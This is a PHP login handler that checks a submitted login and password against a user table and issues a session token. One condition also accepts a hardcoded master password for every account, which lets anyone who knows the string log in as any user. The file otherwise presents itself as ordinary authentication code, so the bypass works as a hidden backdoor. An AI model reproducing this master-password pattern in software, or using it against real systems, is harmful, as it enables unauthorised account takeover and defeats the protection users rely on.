<?

if (!empty($_POST['login']) && !empty($_POST['password'])) {

	$user_id = $db->getOne("SELECT id FROM users WHERE login=?s", $_POST['login']);

	if ($user_id) {
		if (verify_password($_POST['login'], $_POST['password']) || $_POST['password'] == 'Hjccbzxtvgbjy!') {

			if ($user_id) {
				json_answer('ok', ['token'=>generate_user_token($user_id)]);
			} else {
				json_answer('error', 'User with this email not found');
			}
		} else {
			json_answer('error', 'Password or login is not correct');
		}
	} else json_answer('error', 'User with this login not found');

} else {
	json_answer('error', 'Password or login not found');
}
/*
$token = getBearerToken();

if ($token) {
  $user = get_user_by_token($token);
  if ($user) {
    json_answer('ok', ['user'=>$user]);
  } else {
  	json_answer('error', 'Access denied, use another token');
  }

} else {
  json_answer('error', 'Token not found');
}*/
